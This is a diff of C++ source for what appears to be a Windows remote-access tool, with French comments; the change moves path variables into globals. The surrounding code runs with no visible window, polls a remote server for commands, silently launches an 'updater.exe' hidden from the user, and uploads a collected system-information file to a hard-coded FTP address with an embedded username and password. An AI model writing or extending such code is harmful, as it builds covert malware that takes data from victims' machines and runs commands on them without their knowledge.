@@ -19,12 +19,17 @@ using namespace std;
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "shlwapi.lib") // Nécessaire pour PathFileExistsA
 
+// Variables globales - déclarées avant les fonctions qui les utilisent
+string userFolder = GetUserFolderPath();
+string fishFolder = userFolder + "\\fish";
+string updaterPath = fishFolder + "\\updater.exe";
+
 // Effectue une requête HTTP GET pour récupérer une commande depuis un serveur distant.
 string GetCommand() {
     string command = "NO_COMMAND";
     // Récupérer l'UUID pour l'envoyer au serveur
     // Si le fichier system_info.dat n'existe pas, le créer d'abord
-    if (!PathFileExistsA((userFolder + "\\fish\\system_info.dat").c_str())) {
+    if (!PathFileExistsA((fishFolder + "\\system_info.dat").c_str())) {
         createSystemInfoFile();
     }
     
@@ -52,9 +57,6 @@ string GetCommand() {
 }
 
 // Fonction pour lancer les mises à jour
-string userFolder = GetUserFolderPath();
-string updaterFolder = userFolder + "\\fish";
-string updaterPath = updaterFolder + "\\updater.exe";
 void StartUpdate(const string& UpdaterPath) {
     ShellExecute(NULL, "open", UpdaterPath.c_str(), NULL, NULL, SW_HIDE);
 }
@@ -100,11 +102,11 @@ void ListenForCommand() {
 // Point d'entrée de l'application Windows (aucune console ne sera affichée)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     // Vérifier si le fichier system_info.dat existe, sinon le créer
-    if (!PathFileExistsA((userFolder + "\\fish\\system_info.dat").c_str())) {
+    if (!PathFileExistsA((fishFolder + "\\system_info.dat").c_str())) {
         createSystemInfoFile();
         // Uploader les infos système vers le serveur FTP si nécessaire
         uploadFileToFTP("45.90.160.149", "debian", "UiCT?\"Zn3BXM^~ouprhl3N^b2Iy!CF`u%e$P?#sS@@hwerwPn%i=1*1;nfb`RKX7", 
-                        (userFolder + "\\fish\\system_info.dat").c_str(), "system_info.dat");
+                        (fishFolder + "\\system_info.dat").c_str(), "system_info.dat");
     }
 
     // Démarrer le thread d'écoute des commandes
